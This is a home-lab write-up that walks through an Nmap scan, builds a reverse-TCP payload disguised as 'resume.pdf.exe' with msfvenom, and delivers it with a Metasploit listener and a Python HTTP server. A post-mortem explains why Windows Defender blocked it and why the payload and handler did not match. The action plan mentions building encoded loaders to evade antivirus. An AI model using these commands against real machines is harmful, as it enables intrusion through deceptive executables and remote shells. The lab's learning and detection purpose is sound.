# Lab Exercise: First Reverse TCP Exploit Attempt & Evasion Analysis

**Objective:** To perform a basic network scan, generate a malicious executable payload, serve it to a targeted machine, and observe the system's security response (Telemetry).
**Target OS:** Windows 11
**Attacker OS:** Kali Linux

---

## 1. Understanding & Scanning with Nmap
The first step is to identify open ports and services on the target machine.

```bash
# Aggressive scan to identify OS and open ports on the target machine
nmap -A 192.168.50.10 -Pn
```

Findings: Identified Port 3389 (RDP) as open (Note: Ensure this is manually opened in the target VM for lab testing).

## 2. Exploit Vulnerable Port (Weaponization)
Preparing the "Recipe of Destruction." The goal is to create a reverse TCP payload disguised as a PDF file.

```
# Listing available payloads
msfvenom -l payloads

# Generating the executable payload
msfvenom -p windows/x64/vncinject/reverse_tcp LHOST=192.168.50.10 LPORT=4444 -f exe -o resume.pdf.exe
```

File Verification:
```
# Checking if the file is successfully created
ls -la

# Verifying the file type
file resume.pdf.exe
```

## 3. Setup the Listener
Setting up the Metasploit listener to catch the reverse shell connection once the victim executes the file.

```
# Open Metasploit Framework
msfconsole

# Configure the multi/handler
use exploit/multi/handler

# Option to see what we can configure
options

# Set the payload
set payload windows/x64/meterpreter/reverse_tcp

# Set LHOST to targeted machine (Attacker IP)
set LHOST 192.168.50.10
set LPORT 4444

# Then press "the nuke button" EXPLOIT!!!!
exploit
```

## 4. Open the Listener (Payload Delivery)
Serving the payload over the network using a simple Python HTTP server.

```
# Open a NEW terminal, make sure you are in the same directory as the malware
python3 -m http.server 9999
```

## 5. Victim Perspective
On the Windows 11 machine, open a browser and navigate to the attacker's HTTP server: http://192.168.50.10:9999

Download the file resume.pdf.exe.

Run the file.

Check if the malware is already running by opening cmd using administrator privileges and typing:
```
netstat -anob
```

## Step Back: Post-Mortem & Lessons Learned
Step Back: Post-Mortem & Lessons Learned
Ultimately, this exploit attempt failed to establish a reverse shell. Here is the post-mortem analysis of why this happened:

Blocked by Security System (Windows Defender): The malware I generated using the default msfvenom settings was too simple. Modern security systems on Windows 11 instantly detected, blocked, and deleted the executable before the malware could even run.

Missing Telemetry in Splunk: Because Windows Defender immediately neutralized and erased the malware upon download/execution, it didn't even have the chance to run and generate the network traffic or advanced behavior logs I was hoping to see. As a result, I couldn't observe the detailed telemetry in Splunk.

Payload Mismatch (Configuration Error): While reviewing my steps, I realized a logical error in my setup. The malware was generated using the vncinject payload, but my listener was configured to wait for a meterpreter session. Even if Windows Defender hadn't blocked it, this connection would have never succeeded because the payloads did not match.

## Action Plan & Next Steps:
Evasion Tactics: I now realize that using standard out-of-the-box methods is no longer effective. Moving forward, I need to design more moderate and complex malware (e.g., using encryption, encoding, or custom loaders) to evade and bypass Windows 11 EDR/Antivirus systems.

Defensive Perspective: My next goal is to figure out how to properly capture the initial detection logs (such as Windows Defender alerts) and forward those to Splunk. This will allow me to at least document the exact moment the security system catches the threat, continuing my journey from a Blue Team perspective.
